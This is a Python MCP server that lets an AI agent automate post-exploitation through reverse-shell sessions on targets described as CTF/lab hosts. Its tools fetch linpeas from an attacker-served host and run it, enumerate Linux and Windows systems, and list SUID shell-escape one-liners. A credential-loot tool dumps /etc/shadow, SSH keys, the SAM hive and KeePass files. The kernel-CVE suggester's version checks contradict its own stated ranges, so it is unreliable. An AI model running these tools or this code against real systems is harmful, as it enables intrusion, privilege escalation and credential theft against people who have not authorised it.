"""PostEx MCP server — enumeration recipes pushed via tmux sessions.

Phase 2 surface; phase 1 is mostly placeholders that lean on the `shell` server.
The pattern: the agent calls these tools, which send canned enum sequences into
a session by name and return parsed results.
"""

from __future__ import annotations

import json
import os
import secrets
import shlex
from typing import Any

from mcp import ClientSession
from mcp.client.streamable_http import streamablehttp_client
from mcp.server.fastmcp import FastMCP

app = FastMCP(
    "postex",
    host=os.environ.get("HOST", "0.0.0.0"),
    port=int(os.environ.get("PORT", "8080")),
)

# The shell server is a FastMCP streamable-http server — it speaks the MCP
# JSON-RPC protocol at this endpoint, NOT a REST `/tools/<name>` API. We drive
# it with a proper MCP client (an earlier version POSTed to `<url>/tools/...`
# and every recipe 404'd with "tmux_send failed: Not Found").
SHELL_MCP_URL = os.environ.get("MCP_SHELL_URL", "http://shell-mcp:8080/mcp")


def _parse_tool_result(result: Any) -> dict[str, Any]:
    """Coerce an MCP `CallToolResult` into the plain dict our recipes expect.

    FastMCP tools that return a dict populate `structuredContent`; some SDK
    versions wrap a sole value under a `result` key. Fall back to JSON-decoding
    the first text content block, then to the raw text under `output`."""
    structured = getattr(result, "structuredContent", None)
    if isinstance(structured, dict):
        if set(structured) == {"result"} and isinstance(structured["result"], dict):
            return structured["result"]
        return structured
    for block in getattr(result, "content", None) or []:
        text = getattr(block, "text", None)
        if text:
            try:
                parsed = json.loads(text)
                return parsed if isinstance(parsed, dict) else {"output": text}
            except (json.JSONDecodeError, ValueError):
                return {"output": text}
    return {}


# Per-command output cap (chars) for the isolated enum recipes. Big enough for a
# SUID list or /etc/passwd, small enough that a multi-command sweep can't balloon
# past the agent's tool-result size limit and get offloaded to a file (which is
# what happened when a flooded pane returned ~MBs of an app's JS bundle).
_ISOLATE_CAP = 4000

# When the *isolated* read needs a bigger haystack than tmux_read's 12 KB default
# so the markers survive a burst of background noise. We still return only the
# capped slice between the markers, so the agent-facing result stays small.
_ISOLATE_READ_BYTES = 40000

_POLLUTED_SHELL_WARNING = (
    "PANE_POLLUTED: most enum commands could not be cleanly captured — the shell "
    "pane is flooded with background output, commonly the exploited service (a "
    "Node/Next.js server, a web app) writing to the same tty as your reverse "
    "shell. The enum results above are unreliable noise, not real command output. "
    "Get a clean session before re-running enum: upgrade to a PTY "
    "(`python3 -c 'import pty;pty.spawn(\"/bin/bash\")'`), or `su <user>` / SSH "
    "into a fresh shell, then enumerate there."
)


def _isolate_wrap(command: str) -> tuple[str, str, str]:
    """Wrap a POSIX command so its output is bracketed by unique markers.

    A foothold shell often shares its stdout with the exploited service (e.g. a
    Next.js server streaming its JS bundle into the same pane), so a plain
    pane-read captures that background noise instead of the command's output.
    Bracketing the output with per-call markers lets `_isolate_extract` recover
    just the command's bytes and discard whatever the app spewed around them.
    """
    tok = secrets.token_hex(4)
    begin, end = f"__VSb_{tok}__", f"__VSe_{tok}__"
    # printf puts each marker alone on its own line; `{ ...; } 2>&1` runs the
    # command as a group with stderr folded in. The end marker uses `;` (not
    # `&&`) so it prints regardless of the command's exit status.
    wrapped = f"printf '\\n{begin}\\n'; {{ {command}; }} 2>&1; printf '\\n{end}\\n'"
    return wrapped, begin, end


def _isolate_extract(pane: str, begin: str, end: str, *, cap: int = _ISOLATE_CAP) -> dict[str, Any]:
    """Recover a command's own output from a possibly-noisy pane capture.

    Returns `{"output": <clean>, "polluted": False}` on a clean extraction, or
    `polluted=True` when the markers aren't both present — the real output
    scrolled past the read window because the pane is flooding faster than we
    read it.
    """
    # The echoed command line also contains the marker literals; the *printed*
    # markers come after it, so search from the last `begin` forward.
    bi = pane.rfind(begin)
    if bi == -1:
        return {"output": "", "polluted": True, "tail": pane[-300:].strip()}
    body = pane[bi + len(begin):]
    ei = body.find(end)
    if ei == -1:
        # Begin marker captured but end scrolled out — output is mid-flood.
        return {"output": body.strip()[:cap], "polluted": True}
    body = body[:ei].strip("\r\n")
    if len(body) > cap:
        body = body[:cap] + f"\n...[+{len(body) - cap} chars truncated]"
    return {"output": body, "polluted": False}


async def _send_and_read(
    session_name: str,
    command: str,
    timeout_s: float = 15.0,
    *,
    isolate: bool = False,
) -> dict[str, Any]:
    """Send `command` into a shell-server tmux session and return the read.

    Opens one MCP session for the send+read pair. Errors (transport failure, a
    tool-level error, or a `tmux_send` that returned `ok: False`) come back as
    `{"ok": False, "error": ...}` so recipes degrade instead of raising.

    With `isolate=True` the command's output is bracketed by sentinel markers and
    only the bytes between them are returned (capped at `_ISOLATE_CAP`), so a pane
    polluted by the exploited app's background output can't drown or balloon the
    result. The returned dict then carries `polluted: bool`.
    """
    to_send, begin, end = (command, None, None)
    if isolate:
        to_send, begin, end = _isolate_wrap(command)
    try:
        async with streamablehttp_client(SHELL_MCP_URL) as (read_stream, write_stream, _):
            async with ClientSession(read_stream, write_stream) as session:
                await session.initialize()
                send_raw = await session.call_tool(
                    "tmux_send",
                    {"session_name": session_name, "command": to_send},
                )
                if getattr(send_raw, "isError", False):
                    return {"ok": False, "error": f"tmux_send failed: {_parse_tool_result(send_raw)}"}
                send = _parse_tool_result(send_raw)
                if send.get("ok") is False:
                    return {"ok": False, "error": f"tmux_send failed: {send.get('error', send)}"}
                read_args: dict[str, Any] = {"session_name": session_name, "timeout_s": timeout_s}
                if isolate:
                    read_args["max_bytes"] = _ISOLATE_READ_BYTES
                read_raw = await session.call_tool("tmux_read", read_args)
                if getattr(read_raw, "isError", False):
                    return {"ok": False, "error": f"tmux_read failed: {_parse_tool_result(read_raw)}"}
                read = _parse_tool_result(read_raw)
                if isolate and begin and end:
                    read = {**read, **_isolate_extract(read.get("output", "") or "", begin, end)}
                return read
    except Exception as exc:  # noqa: BLE001 — surface transport issues to the agent, don't crash the tool
        return {"ok": False, "error": f"shell MCP call failed: {exc}"}


@app.tool()
async def linux_basic_enum(session_name: str) -> dict[str, Any]:
    """Run a small, low-noise Linux enum sweep against an attached shell."""
    cmds = [
        "id", "uname -a", "cat /etc/os-release",
        "ls -la /home", "sudo -n -l", "find / -perm -4000 -type f 2>/dev/null | head -50",
        "ss -ltnp || netstat -tnlp",
        "cat /etc/passwd",
        "ls -la /etc/cron.d /etc/cron.* 2>/dev/null",
    ]
    outputs = []
    polluted = 0
    for cmd in cmds:
        result = await _send_and_read(session_name, cmd, isolate=True)
        outputs.append({"cmd": cmd, "output": result.get("output", "")})
        if result.get("polluted"):
            polluted += 1
    resp: dict[str, Any] = {"ok": True, "results": outputs}
    if polluted >= max(2, len(cmds) // 2):
        resp["warning"] = _POLLUTED_SHELL_WARNING
    return resp


# linpeas delivery. The target is usually an isolated CTF/lab host with NO
# internet egress, but it *can* reach Kali (it called back a reverse shell), so
# the reliable source is a Kali-served copy at `url=http://<LHOST>:<port>/linpeas.sh`
# (stage it with skills/postex/binary-fetch-and-drop). The public release URL is
# only a last-resort fallback for boxes that do have egress.
_LINPEAS_RELEASE_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
_LINPEAS_TARGET_PATH = "/tmp/.lp.sh"
_LINPEAS_OUT = "/tmp/linpeas.out"
# Plain-text markers linpeas uses for the actionable PE leads — grepped out so
# the agent gets signal instead of a multi-thousand-line dump the pane capture
# would truncate anyway. The full output stays in `_LINPEAS_OUT` to grep further.
_LINPEAS_HIGHLIGHT_RE = (
    r"vulnerable|CVE-[0-9]{4}|[0-9]{1,3}% (a )?[Pp]rob|NOPASSWD|cap_[a-z]+|"
    r"SUID|writable|sudo.*version|GTFO|exploit|interesting|password"
)


def _linpeas_command(mode: str = "fast", url: str | None = None) -> str:
    """Build the shell snippet that fetches + runs linpeas and returns highlights.

    - `-a` (thorough) is passed to **linpeas**, not to bash (`bash -a` only sets
      a shell option — the original bug, so thorough mode never did anything).
    - Sources are tried in order (Kali-served `url` first, public release as
      fallback) with curl→wget fallback; if none yields a non-empty script the
      snippet prints `LINPEAS_FETCH_FAILED` so the caller can detect no-egress.
    - Full output is saved to `_LINPEAS_OUT`; only the highlighted leads are
      echoed back.
    """
    flag = "-a" if mode == "thorough" else ""
    sources = ([url] if url else []) + [_LINPEAS_RELEASE_URL]
    src_list = " ".join(shlex.quote(u) for u in sources)
    run = f"sh {_LINPEAS_TARGET_PATH} {flag}".rstrip()
    return (
        f'SH={_LINPEAS_TARGET_PATH}; rm -f "$SH"; '
        f"for U in {src_list}; do "
        f'(command -v curl >/dev/null 2>&1 && curl -fsSL "$U" -o "$SH") '
        f'|| (command -v wget >/dev/null 2>&1 && wget -qO "$SH" "$U"); '
        f'[ -s "$SH" ] && break; done; '
        f'if [ ! -s "$SH" ]; then echo LINPEAS_FETCH_FAILED; '
        f"else {run} > {_LINPEAS_OUT} 2>&1; "
        f'echo "=== LINPEAS HIGHLIGHTS ==="; '
        f"grep -aiE {shlex.quote(_LINPEAS_HIGHLIGHT_RE)} {_LINPEAS_OUT} | head -150; "
        f'echo "=== full output saved to {_LINPEAS_OUT} ==="; fi'
    )


@app.tool()
async def linpeas(session_name: str, mode: str = "fast", url: str | None = None) -> dict[str, Any]:
    """Fetch + run linpeas on the target and return the highlighted PE leads.

    `mode`: `fast` (default checks) | `thorough` (`-a`, all checks — slower).
    `url`: where the target pulls linpeas from. **Most CTF/lab targets have no
    internet egress**, so the default public-release fallback will fail there —
    pass a Kali-served URL the target *can* reach (it called back your reverse
    shell, so it can reach your LHOST): stage linpeas on Kali via
    `skills/postex/binary-fetch-and-drop` and call with
    `url="http://<LHOST>:<port>/linpeas.sh"`.

    Full output is saved to `/tmp/linpeas.out` on the target; this returns the
    highlighted leads (grep the file for more). If the result contains
    `LINPEAS_FETCH_FAILED`, no source was reachable — stage it on Kali and
    re-call with `url=`.
    """
    timeout = 400.0 if mode == "thorough" else 200.0
    return await _send_and_read(session_name, _linpeas_command(mode, url), timeout_s=timeout)


@app.tool()
async def windows_basic_enum(session_name: str) -> dict[str, Any]:
    """Windows enum sweep — identity, privs, OS/patch level, services,
    installed software, scheduled tasks (with their executable + run-as user,
    including ones hidden from `schtasks /query`), stored creds, listening ports.

    The output of these checks is exactly what's needed to pin the right
    privesc binary variant (GodPotato `-NET2/-NET35/-NET4`, JuicyPotato vs
    PrintSpoofer vs SweetPotato by OS build) before fetching it via
    `prebuilt-exploit-binaries`. Adding a check here is cheaper than
    fetching the wrong binary and re-fetching the right one.
    """
    cmds = [
        # Identity + privs — drives privesc technique selection.
        "whoami", "whoami /priv", "whoami /groups",
        # OS + patch level — drives binary variant + which CVEs apply.
        "systeminfo",
        # Installed .NET versions — drives GodPotato variant pick.
        'dir /b "C:\\Windows\\Microsoft.NET\\Framework"',
        # Users + admin group membership.
        "net user", "net localgroup administrators",
        # Network reachability + listening services.
        "ipconfig /all", "route print",
        "netstat -ano | findstr LISTENING",
        # Patch level — KBs applied (gap analysis for known LPEs).
        "wmic qfe get HotFixID,InstalledOn",
        # Services + their executable paths/privs (unquoted-path, weak ACL).
        "wmic service get name,displayname,startname,pathname /format:list",
        "tasklist /svc",
        # Scheduled tasks (often run as SYSTEM with weak paths).
        "schtasks /query /fo csv /v",
        # Task -> executable -> run-as, structured, in ONE line. This is the
        # signal that decides a scheduled-task privesc: a task whose RunAs is a
        # higher-priv user (Administrator/SYSTEM) and whose Execute path you can
        # write is a direct root. `schtasks /query` HIDES protected tasks; this
        # PowerShell view surfaces them, and the on-disk dump below catches the
        # rest. Read the Action/RunAs columns before trying to interact with any
        # task — never race a task you haven't inspected.
        ('powershell -NoProfile -Command "Get-ScheduledTask | ForEach-Object { '
         "[PSCustomObject]@{ Task=$_.TaskPath+$_.TaskName; "
         "RunAs=$_.Principal.UserId; "
         "Action=($_.Actions | ForEach-Object { $_.Execute + ' ' + $_.Arguments }) -join '|' } } | "
         'Where-Object { $_.RunAs -match \'SYSTEM|Administrator|^NT \' -or $_.Action } | '
         'Format-Table -AutoSize | Out-String -Width 4096"'),
        # On-disk task definitions (catches tasks hidden from `schtasks /query`).
        'dir /a /b "C:\\Windows\\System32\\Tasks" 2>nul',
        # Stored credentials — cmdkey list + creds folder.
        "cmdkey /list",
        'dir /a "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials" 2>nul',
        'dir /a "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials" 2>nul',
        # Autologon / Winlogon (occasionally has plaintext creds).
        'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" 2>nul',
        # AlwaysInstallElevated — instant SYSTEM via MSI if both set to 1.
        'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer 2>nul',
        'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer 2>nul',
        # Other connected sessions (lateral movement leads).
        "net session 2>nul",
        # AV / EDR — affects which payloads will survive.
        'wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayName,productState',
        # ARP cache — what other hosts on the subnet.
        "arp -a",
    ]
    outputs = []
    for cmd in cmds:
        result = await _send_and_read(session_name, cmd)
        outputs.append({"cmd": cmd, "output": result.get("output", "")})
    return {"ok": True, "results": outputs}


@app.tool()
async def suid_enum(session_name: str) -> dict[str, Any]:
    """Parse SUID binary output and surface candidate privesc paths via GTFOBins."""
    cmd = "find / -perm -4000 -type f 2>/dev/null"
    result = await _send_and_read(session_name, cmd, timeout_s=60.0, isolate=True)
    output = result.get("output", "")

    suids = []
    for line in output.splitlines():
        line = line.strip()
        if not line or not line.startswith("/"):
            continue
        suids.append(line)

    candidates = _gtfobins_match(suids)
    resp: dict[str, Any] = {"ok": True, "suids_found": suids, "privesc_candidates": candidates}
    if result.get("polluted"):
        resp["warning"] = _POLLUTED_SHELL_WARNING
    return resp


# A tight whitelist — the GTFOBins corpus is much larger, but these are the
# ones that show up on HTB-class boxes consistently. The phase-3 researcher
# subagent can expand the table at runtime.
_GTFOBINS_QUICK_HITS = {
    "nmap": "Old nmap (interactive mode): `nmap --interactive` then `!sh`. Modern nmap: `nmap --script` with crafted Lua.",
    "vim": "`vim -c ':!/bin/sh'` or `:set shell=/bin/sh` then `:shell`.",
    "find": "`find . -exec /bin/sh \\\\; -quit`",
    "perl": "`perl -e 'exec \"/bin/sh\";'`",
    "python": "`python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'`",
    "python3": "Same as python, `-p` preserves euid.",
    "ruby": "`ruby -e 'exec \"/bin/sh\"'`",
    "awk": "`awk 'BEGIN {system(\"/bin/sh\")}'`",
    "less": "`less /etc/profile` then `!sh`",
    "more": "`more /etc/profile` then `!sh` (works if terminal is small)",
    "man": "`man man` then `!sh`",
    "vi": "Same as vim.",
    "bash": "`bash -p` — preserves euid if SUID bit set.",
    "sh": "`sh -p` — preserves euid.",
    "tar": "`tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`",
    "cp": "Overwrite /etc/passwd with custom root entry.",
    "mv": "Same overwrite technique as cp.",
    "wget": "Download a malicious config or overwrite a privileged file.",
    "curl": "Similar — download to a privileged location.",
    "node": "`node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio:[0,1,2]})'`",
    "gdb": "`gdb -nx -ex '!sh' -ex quit`",
    "env": "`env /bin/sh -p`",
    "expect": "`expect -c 'spawn sh -p; interact'`",
    "ftp": "`ftp` then `!sh`",
    "make": "Bourne-shell escape via empty Makefile and `make -s --eval=$'x:\\n\\t-/bin/sh'`",
    "socat": "`socat stdin exec:/bin/sh,pty,setsid,setpgid,stderr,ctty`",
    "git": "Several paths — `git help status` opens less, then `!sh`",
    "nano": "`nano` then `^R^X` for shell-execute.",
    "rsync": "Old rsync had `--rsync-path` trick — `rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:`",
}


def _gtfobins_match(suid_paths: list[str]) -> list[dict[str, str]]:
    candidates: list[dict[str, str]] = []
    seen: set[str] = set()
    for path in suid_paths:
        binary = path.rsplit("/", 1)[-1]
        if binary in seen:
            continue
        seen.add(binary)
        if binary in _GTFOBINS_QUICK_HITS:
            candidates.append({
                "path": path,
                "binary": binary,
                "technique": _GTFOBINS_QUICK_HITS[binary],
            })
    return candidates


@app.tool()
async def kernel_suggester(session_name: str) -> dict[str, Any]:
    """Read kernel version + arch and return a shortlist of plausible kernel
    privesc CVEs. Not authoritative — the agent should still verify with
    `searchsploit_lookup` against the exact version string.
    """
    res = await _send_and_read(session_name, "uname -a", timeout_s=5.0, isolate=True)
    banner = (res.get("output", "") or "").strip()

    suggestions: list[dict[str, str]] = []
    if "Linux" in banner:
        # Pull the kernel `x.y.z[-N]` token.
        import re as _re
        match = _re.search(r"Linux \S+ (\d+\.\d+\.\d+)(\-\d+)?", banner)
        if match:
            kernel = match.group(1)
            major, minor, patch = (int(x) for x in kernel.split("."))
            # A few well-known ranges — not a substitute for the real DB.
            if (major, minor) <= (5, 8):
                suggestions.append({
                    "cve": "CVE-2022-0847",
                    "name": "DirtyPipe",
                    "kernels": "5.8 - 5.16.11 / 5.15.25 / 5.10.102",
                    "verify": "searchsploit dirty pipe",
                })
            if (major, minor) <= (3, 19):
                suggestions.append({
                    "cve": "CVE-2016-5195",
                    "name": "DirtyCOW",
                    "kernels": "<= 4.8.3",
                    "verify": "searchsploit dirtycow",
                })
            if major < 4 or (major == 4 and minor < 4):
                suggestions.append({
                    "cve": "CVE-2017-1000112",
                    "name": "UFO local privesc",
                    "kernels": "various 4.x",
                    "verify": "searchsploit ufo udp",
                })

    return {"ok": True, "uname": banner, "suggestions": suggestions}


@app.tool()
async def loot_credentials(session_name: str, os_kind: str = "linux") -> dict[str, Any]:
    """Targeted credential loot. Lab/engagement mode only."""
    if os_kind == "linux":
        cmds = [
            "find / -name '*.pem' -o -name '*.key' -o -name 'id_rsa*' 2>/dev/null | head -20",
            "find / -name '.aws' -o -name '.docker' 2>/dev/null | head -20",
            "grep -ri password /etc 2>/dev/null | head -30",
            "ls -la /root/.ssh /home/*/.ssh 2>/dev/null",
            "cat /etc/shadow 2>/dev/null | head",
        ]
    else:
        cmds = [
            "reg query HKLM\\SAM",
            "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions",
            "cmdkey /list",
            "dir /s /b C:\\Users\\*.kdbx C:\\Users\\*.txt 2>nul",
        ]
    isolate = os_kind == "linux"  # marker isolation is POSIX-shell only
    outputs = []
    polluted = 0
    for cmd in cmds:
        result = await _send_and_read(session_name, cmd, isolate=isolate)
        outputs.append({"cmd": cmd, "output": result.get("output", "")})
        if result.get("polluted"):
            polluted += 1
    resp: dict[str, Any] = {"ok": True, "results": outputs}
    if isolate and polluted >= max(2, len(cmds) // 2):
        resp["warning"] = _POLLUTED_SHELL_WARNING
    return resp


def main() -> None:
    app.run(transport="streamable-http")


if __name__ == "__main__":
    main()
